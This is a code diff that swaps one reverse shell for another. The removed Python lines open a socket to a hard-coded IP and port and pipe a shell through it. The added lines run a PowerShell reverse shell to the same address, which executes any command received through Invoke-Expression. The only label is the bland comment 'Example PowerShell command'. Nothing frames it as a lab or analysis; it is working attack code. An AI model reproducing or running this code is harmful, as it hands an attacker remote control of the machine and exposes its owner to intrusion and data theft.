@@ -1,29 +1,18 @@
-import os,socket,subprocess,threading;
-def s2p(s, p):
-    while True:
-        data = s.recv(1024)
-        if len(data) > 0:
-            p.stdin.write(data)
-            p.stdin.flush()
+import subprocess
 
-def p2s(s, p):
-    while True:
-        s.send(p.stdout.read(1))
+# Example PowerShell command
+ps_command = '''$LHOST = "92.247.214.122"; $LPORT = 9876; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()'''
 
-s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-s.connect(("92.247.214.122",9876))
+# Run PowerShell command
+result = subprocess.run(
+    ["powershell", "-Command", ps_command],
+    capture_output=True,
+    text=True
+)
 
-p=subprocess.Popen(["sh"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
+# Output the result
+print("STDOUT:")
+print(result.stdout)
 
-s2p_thread = threading.Thread(target=s2p, args=[s, p])
-s2p_thread.daemon = True
-s2p_thread.start()
-
-p2s_thread = threading.Thread(target=p2s, args=[s, p])
-p2s_thread.daemon = True
-p2s_thread.start()
-
-try:
-    p.wait()
-except KeyboardInterrupt:
-    s.close()
+print("STDERR:")
+print(result.stderr)
